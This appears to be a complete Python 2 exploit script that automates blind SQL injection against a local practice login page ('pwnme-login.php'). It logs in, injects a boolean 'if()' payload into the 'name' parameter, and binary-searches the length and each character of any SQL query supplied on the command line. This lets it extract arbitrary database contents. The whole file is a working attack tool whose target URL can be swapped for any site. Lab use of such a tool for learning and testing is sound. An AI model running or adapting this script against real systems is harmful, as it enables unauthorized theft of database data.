#!/usr/bin/env python
"""
    Automated blind SQLi automated
    DiabloHorn https://diablohorn.wordpress.com
    References:
        http://stackoverflow.com/questions/212358/binary-search-in-python/212413#212413
"""

import requests
import sys

BASE_URL = "http://localhost/pwnme-login.php"
BASE_QUERY = "root' and 1=if(({}){}{},1,2)-- "
SUCCESS_TEXT = "user exists"
URL_PARAMS = {'name':None}
URL_SESSION = requests.Session()

def do_login():
    global URL_SESSION
    
    postdata = {'user':'webuser','pass':'webpass'}
    print URL_SESSION.post("http://localhost/pwnme-login.php",data=postdata).text
    
def get_query_result(data):
    global URL_PARAMS
    global URL_SESSION
    
    URL_PARAMS['name'] = data
    pagecontent = URL_SESSION.get(BASE_URL, params=URL_PARAMS).text
    if SUCCESS_TEXT in pagecontent.lower():
        return True
    else:
        return False

def binsearch(query,sl,sh):
    searchlow = sl
    searchhigh = sh
    searchmid = 0
    while True:       
        searchmid = (searchlow + searchhigh) / 2
        if get_query_result(BASE_QUERY.format(query, "=", searchmid)):
            break
        elif get_query_result(BASE_QUERY.format(query, ">", searchmid)):
            searchlow = searchmid + 1
        elif get_query_result(BASE_QUERY.format(query, "<", searchmid)):
            searchhigh = searchmid
    return searchmid

def querylength(query):
    return binsearch("length(({}))".format(query),0,100)

def execquery(query):
    fulltext = ""
    qlen = querylength(query) + 1
    print "Retrieving {} bytes".format(qlen-1)
    for i in range(1,qlen):
        sys.stdout.write(chr(binsearch("ord(substring(({}),{},1))".format(query,i),0,127)))
    print ""
        
if __name__ == "__main__":
    if len(sys.argv) != 2:
        print sys.argv[0] + " \"select @@version\""
        sys.exit()
    do_login()
    execquery(sys.argv[1])
